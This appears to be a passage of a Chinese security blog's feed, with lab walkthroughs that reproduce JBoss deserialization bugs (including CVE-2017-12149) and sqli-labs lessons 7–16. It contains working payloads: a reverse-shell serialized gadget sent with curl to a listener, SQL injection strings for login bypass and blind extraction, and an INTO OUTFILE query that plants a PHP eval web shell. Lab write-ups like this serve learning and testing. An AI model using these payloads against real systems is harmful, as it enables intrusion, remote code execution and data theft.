    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>Red Hat JBoss Application Server</code>是一款基于<code>JavaEE</code>的开源应用服务器。<code>JBoss AS 4.x</code>及之前版本中，<code>JbossMQ</code>实现过程的<code>JMS over HTTP Invocation Layer</code>的<code>HTTPServerILServlet.java</code>文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，目标为<code>http://your-ip:8080</code>。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>/jbossmq-httpil/HTTPServerILServlet</code></p><p>返回<code>This is the JBossMQ HTTP-IL</code>，说明页面存在，此页面存在反序列化漏洞。</p><p><img src="https://qiniu.hzktester.top/tp2020100907.png" alt="image"></p><p>这里直接利用<code>CVE-2017-12149</code>生成的ser，发送到<code>/jbossmq-httpil/HTTPServerILServlet</code>接口中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100908.png" alt="image"></p><p>反弹shell：</p><p><img src="https://qiniu.hzktester.top/tp2020100909.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Red Hat JBoss Application Server&lt;/code&gt;是一款基于&lt;code&gt;JavaEE&lt;/code&gt;的开源应用服务器。&lt;code&gt;JBoss AS 4.x&lt;/code&gt;及之前版本中，&lt;code&gt;JbossMQ&lt;/code&gt;实现过程的&lt;code&gt;JMS over HTTP Invocation Layer&lt;/code&gt;的&lt;code&gt;HTTPServerILServlet.java&lt;/code&gt;文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。&lt;/p&gt;
&lt;h2 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;环境启动后，目标为&lt;code&gt;http://your-ip:8080&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;访问&lt;code&gt;/jbossmq-httpil/HTTPServerILServlet&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;返回&lt;code&gt;This is the JBossMQ HTTP-IL&lt;/code&gt;，说明页面存在，此页面存在反序列化漏洞。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020100907.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里直接利用&lt;code&gt;CVE-2017-12149&lt;/code&gt;生成的ser，发送到&lt;code&gt;/jbossmq-httpil/HTTPServerILServlet&lt;/code&gt;接口中&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="JBoss" scheme="https://hzktester.top/tags/JBoss/"/>
    
  </entry>
  
  <entry>
    <title>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</title>
    <link href="https://hzktester.top/posts/33d0907b.html"/>
    <id>https://hzktester.top/posts/33d0907b.html</id>
    <published>2020-10-09T08:56:00.000Z</published>
    <updated>2020-10-20T09:21:51.052Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>该漏洞为<code>Java</code>反序列化错误类型，存在于<code>Jboss</code>的<code>HttpInvoker</code>组件中的 <code>ReadOnlyAccessFilter</code>过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>漏洞影响5.x和6.x版本的JBOSSAS</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到<code>JBoss</code>默认页面。</p><p><img src="https://qiniu.hzktester.top/tp2020100901.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>/invoker/readonly</code>，返回500，说明页面存在，此页面存在反序列化漏洞。</p><p><img src="https://qiniu.hzktester.top/tp2020100902.png" alt="image"></p><p>利用工具:<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>,我们选择一个<code>Gadget</code>：<code>ReverseShellCommonsCollectionsHashMap</code>，编译并生成序列化数据：</p><p><img src="https://qiniu.hzktester.top/tp2020100903.png" alt="image"></p><p>生成<code>ReverseShellCommonsCollectionsHashMap.class</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br></pre></td></tr></table></figure><p>生成<code>ReverseShellCommonsCollectionsHashMap.ser</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 47.101.62.20:1234（ip是nc所在的ip）</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100904.png" alt="image"></p><p>利用，监听端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure><p>发送poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8080&#x2F;invoker&#x2F;readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100905.png" alt="image"></p><p>反弹shell:</p><p><img src="https://qiniu.hzktester.top/tp2020100906.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;该漏洞为&lt;code&gt;Java&lt;/code&gt;反序列化错误类型，存在于&lt;code&gt;Jboss&lt;/code&gt;的&lt;code&gt;HttpInvoker&lt;/code&gt;组件中的 &lt;code&gt;ReadOnlyAccessFilter&lt;/code&gt;过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。&lt;/p&gt;
&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;漏洞影响5.x和6.x版本的JBOSSAS&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首次执行时会有1~3分钟时间初始化，初始化完成后访问&lt;code&gt;http://your-ip:8080/&lt;/code&gt;即可看到&lt;code&gt;JBoss&lt;/code&gt;默认页面。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020100901.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;访问&lt;code&gt;/invoker/readonly&lt;/code&gt;，返回500，说明页面存在，此页面存在反序列化漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="JBoss" scheme="https://hzktester.top/tags/JBoss/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less11-16(二次注入)</title>
    <link href="https://hzktester.top/posts/18b82261.html"/>
    <id>https://hzktester.top/posts/18b82261.html</id>
    <published>2020-10-04T15:29:00.000Z</published>
    <updated>2020-10-20T09:21:51.035Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><p>这一关开始使用post注入，什么是post注入呢？</p><blockquote><p> 就是数据从客户端提交<br>到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，<br>提交到服务器后服务器再进行验证。这就是一次 post 的过程的。</p></blockquote><p>当我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39;</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100404.png" alt="image"></p><p>显示错误了，可以从错误中分析到程序对参数进行单引号的处理。<br>这里我们可以在输入框输入万能密码来尝试一下。</p><p>这里<code>username</code>输入：<code>admin&#39;or&#39;1&#39;=&#39;1#</code>，密码随意</p><p><img src="https://qiniu.hzktester.top/tp2020100405.png" alt="image"></p><p>返回的正确的结果，那么原因是什么呢？我们在<code>background-1</code>中已经其实提到了，逻辑运算的部分中已经讲解了原理。</p><p>当我们提交<code>username</code>和<code>password</code>后，后台形成的<code>sql</code>语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39;or&#39;1&#39;&#x3D;&#39;1# and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><blockquote><p>在#以后的内容就被注释掉，前面的内容因为or 1=1恒成立，所以语句就成立，我们此时以admin的用户登录。那么接下来我们尝试用get注入中用到的其他的语句代替or 1=1进行注入。</p></blockquote><p>这里我们用 union 注入进行尝试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：1admin&#39;union select 1,database()#</span><br><span class="line">passwd&#x3D;1（任意密码）</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100406.png" alt="image"></p><p>可以看到显示了<code>database</code>为<code>security</code>，这是我们比较常用的手法。<br>还可以利用其他的方法进行注入</p><h2 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h2><p>本关于11不同之处在于，id参数使用了”)过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&quot;)#</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100407.png" alt="image"></p><h2 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h2><p>本关id参数使用了’)过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39;)#</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100408.png" alt="image"></p><blockquote><p>我们可以明显的看到本关不会显示你的登录信息了，只能给你一个是否登录成功的返回数据。那我们这里可以用下布尔类型的盲注。</p></blockquote><p>猜测数据库第一位:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;)and left(database(),1)&gt;&#39;a&#39;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100409.png" alt="image"></p><p>登录成功，就这样可以挨着对每一位进行测试，<code>less5</code>中我们已经讲到了这个过程了，这里就不重复了。</p><blockquote><p>在按位进行猜解的过程中，可以利用二分法，可以有效的降低尝试次<br>数</p></blockquote><h2 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h2><p>本关id参数使用了”过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100410.png" alt="image"></p><p>登录成功，同样没有输入结果，这里使用报错盲注演示一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100411.png" alt="image"></p><p>可以看到报错了，显示版本信息</p><h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><p>本关id参数使用了’过滤，且没有错误提示，那么我们只能靠猜测进行盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100412.png" alt="image"></p><p>正确的时候可以直接登录，不正确的时候延时 5 秒。其他payload参考Less9</p><h2 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h2><p>本关和Less15的处理方法是一样的，同样使用延时注入的方法进行解决。不同的是id参数使用了”)的处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot;)and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100413.png" alt="image"></p><p>正确的时候可以直接登录，不正确的时候延时 5 秒。其他payload参考Less9</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Less11&quot;&gt;&lt;a href=&quot;#Less11&quot; class=&quot;headerlink&quot; title=&quot;Less11&quot;&gt;&lt;/a&gt;Less11&lt;/h2&gt;&lt;p&gt;这一关开始使用post注入，什么是post注入呢？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; 就是数据从客户端提交&lt;br&gt;到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，&lt;br&gt;提交到服务器后服务器再进行验证。这就是一次 post 的过程的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当我们输入&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;username:admin&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Password:ddd(任意值)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020100404.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;显示错误了，可以从错误中分析到程序对参数进行单引号的处理。&lt;br&gt;这里我们可以在输入框输入万能密码来尝试一下。&lt;/p&gt;
&lt;p&gt;这里&lt;code&gt;username&lt;/code&gt;输入：&lt;code&gt;admin&amp;#39;or&amp;#39;1&amp;#39;=&amp;#39;1#&lt;/code&gt;，密码随意&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020100405.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;返回的正确的结果，那么原因是什么呢？我们在&lt;code&gt;background-1&lt;/code&gt;中已经其实提到了，逻辑运算的部分中已经讲解了原理。&lt;/p&gt;</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less-8-10</title>
    <link href="https://hzktester.top/posts/5809cdbe.html"/>
    <id>https://hzktester.top/posts/5809cdbe.html</id>
    <published>2020-10-04T08:33:00.000Z</published>
    <updated>2020-10-20T09:21:51.034Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2><p>经过简单的测试，发现<code>&#39;or 1=1--+</code>返回结果正常，基本确定应该怎么注入了</p><p><img src="https://qiniu.hzktester.top/tp2020100401.png" alt="image"></p><p>这里查看源码可以看出，对sql报错进行了注释，那么采用报错注入就不行了</p><p><img src="https://qiniu.hzktester.top/tp2020100402.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat(0x3a,0x3a,(select user())),0x3a,0x3a,floor(rand(0)*2))a from information schema.columns group by a--+</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100403.png" alt="image"></p><p>如果报错注入可以使用的话是可以直接返回user()的，但是这里没有返回。</p><p>其他的payload参考less5直接进行注入即可</p><h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>本关从标题可以看到《基于时间-单引号》，所以很明显这关要利用延时注入进行，同时id参数进行的是’的处理。大概演示一次演示注入。使用<code>sleep()</code>函数</p><p>这里因为利用的是时间的延迟，贴图就没意义了，只写payload了：（正确的时候直接返回，不正确的时候等待5秒钟，只贴正确的）</p><h3 id="猜测数据库"><a href="#猜测数据库" class="headerlink" title="猜测数据库"></a>猜测数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>说明第一位是s（ascii码是115）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr(database(),2,1))&#x3D;101,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>说明第二位是e（ascii码是101）</p><p>……</p><p>以此类推，我们知道了数据库名字是<code>security</code></p><h3 id="猜测security的数据表"><a href="#猜测security的数据表" class="headerlink" title="猜测security的数据表"></a>猜测security的数据表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>猜测第一个数据表的第一位是 e,…依次类推，得到<code>email</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),1,1))&#x3D;114,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>猜测第二个数据表的第一位是 r,…依次类推，得到<code>referers</code></p><p>……</p><p>再以此类推，我们可以得到所有的数据表<code>emails,referers,uagents,users</code></p><h3 id="猜测users表的列"><a href="#猜测users表的列" class="headerlink" title="猜测users表的列"></a>猜测users表的列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1 &#39;and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&#x3D;105,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>猜测<code>users</code>表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是<code>id,username,password</code></p><h3 id="猜测username的值"><a href="#猜测username的值" class="headerlink" title="猜测username的值"></a>猜测username的值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39;and If(ascii(substr((select username from users limit 0,1), 1,1))&#x3D;67,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>猜测<code>username</code>的第一行的第一位</p><p>以此类推，我们得到数据库<code>username,password</code>的所有内容</p><h2 id="Less10"><a href="#Less10" class="headerlink" title="Less10"></a>Less10</h2><p>本关我们从标题就可以看到《基于时间-双引号》，所以很明显的这关要我们利用延时注入进行，同时id参数进行的是“的处理。和less9的区别就在于单引号（‘）变成了（“）,我们这里给出一个 payload 示例，其他的请参考 less-9</p><h3 id="猜测数据库-1"><a href="#猜测数据库-1" class="headerlink" title="猜测数据库"></a>猜测数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>其余的示例请参考 less9</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Less8&quot;&gt;&lt;a href=&quot;#Less8&quot; class=&quot;headerlink&quot; title=&quot;Less8&quot;&gt;&lt;/a&gt;Less8&lt;/h2&gt;&lt;p&gt;经过简单的测试，发现&lt;code&gt;&amp;#39;or 1=1--+&lt;/code&gt;返回结果正常，基本确定应该怎么注入了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020100401.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里查看源码可以看出，对sql报错进行了注释，那么采用报错注入就不行了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020100402.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;sqli-labs&amp;#x2F;Less-8&amp;#x2F;?id&amp;#x3D;1&amp;#39; union select 1,count(*),concat(0x3a,0x3a,(select user())),0x3a,0x3a,floor(rand(0)*2))a from information schema.columns group by a--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020100403.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果报错注入可以使用的话是可以直接返回user()的，但是这里没有返回。&lt;/p&gt;
&lt;p&gt;其他的payload参考less5直接进行注入即可&lt;/p&gt;
&lt;h2 id=&quot;less9&quot;&gt;&lt;a href=&quot;#less9&quot; class=&quot;headerlink&quot; title=&quot;less9&quot;&gt;&lt;/a&gt;less9&lt;/h2&gt;</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less-7(上传webshell)</title>
    <link href="https://hzktester.top/posts/6dd81cb5.html"/>
    <id>https://hzktester.top/posts/6dd81cb5.html</id>
    <published>2020-10-01T17:35:00.000Z</published>
    <updated>2020-10-20T09:21:51.033Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>本关利用文件导入的方式进行注入</p><p>查看源码，重点关注对id参数的处理和sql语句上，源代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>这里对id参数进行了’))处理，所以可以尝试<code>&#39;)) or 1=1--+</code>进行注入</p><p><img src="https://qiniu.hzktester.top/tp2020100201.png" alt="image"></p><p>我们这里利用上述提到的文件导入的方式进行演示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,3 into outfile &quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100202.png" alt="image"></p><p>上图中显示sql语句出错了，但是文件中可以看到1.txt已经生成了。</p><p><img src="https://qiniu.hzktester.top/tp2020100203.png" alt="image"></p><p>直接写入php一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,&#39;&lt;?php @eval($_post[&quot;mima&quot;])?&gt;&#39; into outfile &quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020100204.png" alt="image"></p><p>文件中可以看到已经上传成功了</p><p><img src="https://qiniu.hzktester.top/tp2020100205.png" alt="image"></p><p>然后使用冰蝎、菜刀等工具连接即可</p>]]></content>
    
    
